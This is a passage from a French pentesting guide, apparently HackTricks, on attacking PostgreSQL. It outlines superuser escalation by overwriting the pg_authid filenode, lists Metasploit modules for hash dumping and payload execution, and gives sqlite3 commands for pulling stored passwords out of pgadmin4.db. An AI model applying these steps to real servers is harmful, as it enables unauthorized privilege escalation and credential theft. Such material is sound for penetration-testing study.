../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc en écrasant les tables internes PostgreSQL

> [!TIP]
> Le vecteur de privesc suivant est particulièrement utile dans des contextes SQLi contraints, car toutes les étapes peuvent être effectuées via des SELECT imbriqués

Si vous pouvez **lire et écrire les fichiers du serveur PostgreSQL**, vous pouvez **devenir superuser** en écrasant le filenode sur disque de PostgreSQL, associé à la table interne `pg_authid`.

En savoir plus sur **cette technique** [**ici**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Les étapes de l'attaque sont :

1. Obtenir le répertoire de données PostgreSQL
2. Obtenir un chemin relatif vers le filenode, associé à la table `pg_authid`
3. Télécharger le filenode via les fonctions `lo_*`
4. Récupérer le type de données associé à la table `pg_authid`
5. Utilisez le [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) pour [modifier le filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table) ; réglez tous les indicateurs booléens `rol*` à 1 pour obtenir les permissions complètes.
6. Rétéléverser le filenode modifié via les fonctions `lo_*`, et écraser le fichier original sur le disque
7. _(Optionnel)_ Vider le cache de table en mémoire en exécutant une requête SQL coûteuse
8. Vous devriez maintenant disposer des privilèges d'un superadmin complet.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### journalisation

Dans le fichier _**postgresql.conf**_, vous pouvez activer les logs postgresql en modifiant :
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Ensuite, **redémarrez le service**.

### pgadmin

[pgadmin](https://www.pgadmin.org) est une plateforme d'administration et de développement pour PostgreSQL.\
Vous pouvez trouver **passwords** dans le fichier _**pgadmin4.db**_\
Vous pouvez les déchiffrer en utilisant la fonction _**decrypt**_ dans le script : [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

L'authentification des clients dans PostgreSQL est gérée via un fichier de configuration nommé **pg_hba.conf**. Ce fichier contient une série d'enregistrements, chacun spécifiant un type de connexion, une plage d'adresses IP cliente (si applicable), le nom de la base de données, le nom d'utilisateur et la méthode d'authentification à utiliser pour faire correspondre les connexions. Le premier enregistrement qui correspond au type de connexion, à l'adresse cliente, à la base de données demandée et au nom d'utilisateur est utilisé pour l'authentification. Il n'y a pas de mécanisme de secours si l'authentification échoue. Si aucun enregistrement ne correspond, l'accès est refusé.

Les méthodes d'authentification basées sur un mot de passe disponibles dans pg_hba.conf sont **md5**, **crypt**, et **password**. Ces méthodes diffèrent par la manière dont le mot de passe est transmis : haché en MD5, chiffré via crypt, ou en clair. Il est important de noter que la méthode crypt ne peut pas être utilisée avec des mots de passe qui ont été cryptés dans pg_authid.

## References

- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
